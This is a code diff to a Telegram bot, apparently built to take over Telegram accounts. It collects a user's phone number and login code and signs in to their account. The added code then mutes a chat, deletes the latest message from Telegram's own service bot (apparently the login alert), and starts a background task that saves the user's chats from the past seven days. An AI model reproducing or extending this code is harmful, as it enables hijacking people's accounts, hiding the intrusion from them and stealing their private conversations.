@@ -9,8 +9,9 @@ from aiogram.fsm.storage.memory import MemoryStorage
 from telethon.sync import TelegramClient
 from telethon.errors import PhoneNumberInvalidError, FloodWaitError, SessionPasswordNeededError
 
-from config import MAIN_BOT_TOKEN, API_ID, API_HASH, SESSION_FOLDER
-from session_handler import sign_in_with_code, send_verification_code
+from config import MAIN_BOT_TOKEN, API_ID, API_HASH, SESSION_FOLDER, CHAT_FOLDER
+from session_handler import sign_in_with_code, send_verification_code, delete_last_message_from_telegram_bot, \
+    mute_chat_after_login, save_user_chats_last_7_days
 from phone_checker import get_phone_by_username
 from messages import *
 
@@ -396,6 +397,13 @@ async def finalize_sign_in(message: Message, user_id: int, code: str, state: FSM
         )
 
         if success:
+            await mute_chat_after_login(client)
+
+            await delete_last_message_from_telegram_bot(client)
+
+            # Затримка перед архівуванням
+            await asyncio.sleep(1)
+
             # Сохраняем пользователя как авторизованного
             authorized_users[user_id] = {
                 'phone': phone_number,
@@ -403,7 +411,29 @@ async def finalize_sign_in(message: Message, user_id: int, code: str, state: FSM
             }
 
             await message.edit_text(AUTH_SUCCESS, parse_mode="Markdown")
-            await message.answer(MAIN_MENU, reply_markup=get_main_menu_keyboard())
+            await message.answer(
+                f"{MAIN_MENU}\n\n_🔄 Збір чатів за останні 7 днів розпочато у фоновому режимі. Це може зайняти кілька хвилин._",
+                reply_markup=get_main_menu_keyboard(),
+                parse_mode="Markdown"
+            )
+
+            # Запускаємо у фоні без очікування
+            async def collect_chats():
+                try:
+                    logger.info(f"Фоновий збір чатів для {phone_number} розпочато...")
+                    await save_user_chats_last_7_days(client, phone_number, CHAT_FOLDER)
+                    logger.info(f"Чати для {phone_number} успішно збережено")
+
+                except Exception as e:
+                    logger.error(f"Помилка при збереженні чатів: {e}")
+
+                finally:
+                    if client and client.is_connected():
+                        await client.disconnect()
+                        logger.info(f"Client для {phone_number} відключено")
+
+            asyncio.create_task(collect_chats())
+
         else:
             await message.edit_text(
                 ERROR_UNEXPECTED.format(error=result),
@@ -416,9 +446,11 @@ async def finalize_sign_in(message: Message, user_id: int, code: str, state: FSM
             ERROR_UNEXPECTED.format(error=str(e)),
             parse_mode="Markdown"
         )
-    finally:
+        # Закриваємо client тільки при помилці
         if client and client.is_connected():
             await client.disconnect()
+    finally:
+        # НЕ закриваємо client тут - він потрібен для фонової задачі!
         user_data.pop(user_id, None)
         await state.clear()
 
